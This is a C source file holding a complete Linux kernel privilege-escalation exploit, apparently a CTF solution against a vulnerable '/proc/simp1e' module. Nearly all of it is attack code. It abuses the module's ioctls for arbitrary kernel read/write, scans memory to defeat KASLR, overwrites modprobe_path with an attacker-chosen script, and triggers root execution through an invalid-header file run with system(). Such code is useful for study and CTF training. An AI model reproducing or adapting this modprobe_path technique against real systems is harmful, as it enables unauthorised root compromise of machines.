/**
 * Compile with: gcc exploit.c -o exploit -O0 -std=c99 -Wall --static -fpic
 */

#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>
#include <sched.h>
#include <stddef.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>


#define CMD_NEW_CHANNEL 0x77617364
#define CMD_DELETE_CHANNEL 0x77617365
#define CMD_INC_BUF_SIZE 0x77617366
#define CMD_DEC_BUF_SIZE 0x77617367
#define CMD_READ_BUF 0x77617368
#define CMD_WRITE_BUF 0x77617369
#define CMD_CHANGE_POS 0x7761736a
#define CMD_DESTROY_CHANNEL 0x7761736b

#define HIGH_KERNEL_ADDRESS_BORDER ((uint64_t)0xffffffff80000000)
#define PAGE_SIZE 4096
#define SEARCH_LIMIT 500000

typedef struct create_channel_arg_t
{
    size_t buf_size;
    int index;
} create_channel_arg_t;

typedef struct delete_channel_arg_t
{
    int index;
} delete_channel_arg_t;

typedef struct realloc_channel_arg_t
{
    int index;
    long count;
} realloc_channel_arg_t;

typedef struct read_buf_arg_t
{
    size_t ofst; //?
    void *dst;
    size_t count;
} read_buf_arg_t;

typedef struct write_buf_arg_t
{
    size_t ofst; //?
    void *src;
    size_t count;
} write_buf_arg_t;

typedef struct change_pos_arg_t
{
    char pad[8];
    size_t new_pos;
    int flag;
    char pad2[4];
} change_pos_arg_t;

typedef struct destroy_channel_arg_t
{
    int index;
} destroy_channel_arg_t;


int g_fd;
int g_index;

int write_buf(int fd, size_t count, char *data) {
    write_buf_arg_t write_arg;

    write_arg.src = data;
    write_arg.count = count;

    if (ioctl(fd, CMD_WRITE_BUF, &write_arg) < 0) {
        return -1;
    }

    return 0;
}

int read_buf(int fd, size_t count, char *dst) {
    read_buf_arg_t read_arg;

    read_arg.count = count;
    read_arg.dst = dst;

    if (ioctl(fd, CMD_READ_BUF, &read_arg) < 0) {
        return -1;
    } else

    return 0;
}

int create_channel(int fd, size_t buf_size, int *index) {
    create_channel_arg_t create_channel_arg;

    create_channel_arg.buf_size = buf_size;
    if (ioctl(fd, CMD_NEW_CHANNEL, &create_channel_arg) < 0) {
        perror("[!] Failed to create new channel");
        return -1;
    }

    *index = create_channel_arg.index;
    return 0;
}

int dec_buf_size(int fd, size_t count, int index) {
    realloc_channel_arg_t realloc_channel_arg;

    realloc_channel_arg.count = count;
    realloc_channel_arg.index = index;

    if (ioctl(fd, CMD_DEC_BUF_SIZE, &realloc_channel_arg) < 0) {
        perror("[!] Failed to dec buf size\n");
        return -1;
    }

    return 0;
}

int change_pos(int fd, size_t new_pos) {
    change_pos_arg_t change_pos_arg;

    change_pos_arg.flag = 0;
    change_pos_arg.new_pos = new_pos;

    if (ioctl(fd, CMD_CHANGE_POS, &change_pos_arg) < 0) {
        return -1;
    }

    return 0;
}


int init()
{
    g_fd = open("/proc/simp1e", O_RDWR, 0);
    if (g_fd < 0)
    {
        perror("[!] Error on open /proc/simp1e");
        return -1;
    }

    if (create_channel(g_fd, 1, &g_index) < 0)
        return -1;


    if (dec_buf_size(g_fd, 2, g_index) < 0)
        return -1;

    return 0;
}

int find_modprobe_path_ofst() {
    /* Bypass KASLR and find modprobe ofst */
    char buf[PAGE_SIZE];
    char *modprobe_path_addr;
    size_t pos;

    for (int i = 0; i < SEARCH_LIMIT; ++i) {
        pos = HIGH_KERNEL_ADDRESS_BORDER + PAGE_SIZE * i;

        change_pos(g_fd, pos);
        read_buf(g_fd, PAGE_SIZE, buf);

        modprobe_path_addr = memmem(buf, PAGE_SIZE, "/sbin/modprobe", strlen("/sbin/modprobe"));
        if (!modprobe_path_addr) {
            continue;
        }

        change_pos(g_fd, pos + (modprobe_path_addr - buf));

        return 0;
    }

    return -1;
}

int overwrite_modprobe_path(char* binary_name) {
    return write_buf(g_fd, strlen(binary_name) + 1, binary_name);
}

void trigger_exploit() {
    /* Note: in the CTF challenge there is no /tmp folder. Therefore one must place trigger_modprobe somewhere else. */
    system("echo -ne \xff\xff\xff\xff > /tmp/trigger_modprobe");
    system("chmod u+x /tmp/trigger_modprobe");
    system("/tmp/trigger_modprobe");
}

int main(int argc, char** argv)
{
    if (argc != 2) {
        printf("[-] Invalid argument number\n");
        printf("\tUsage ./exploit <binary name>\n");
        printf("\texample binary: #!/bin/sh\\n777 /flag\n");
        return -1;
    } 

    if (init() < 0)
    {
        printf("[-] Failed to initialize\n");
        return -1;
    }
    printf("[+] Succeeded to initialize\n");


    if (find_modprobe_path_ofst() < 0) {
        printf("[-] Failed to find modprobe_path offset\n");
        return -1;
    } 
    printf("[+] Found modprobe_path offset\n");

    
    if (overwrite_modprobe_path(argv[1]) < 0) {
        printf("[-] Failed to overwrite modprobe_path\n");
        return -1;
    }
    printf("[+] Succeeded to overwrite modprobe_path\n");

    trigger_exploit();

    return 0;
}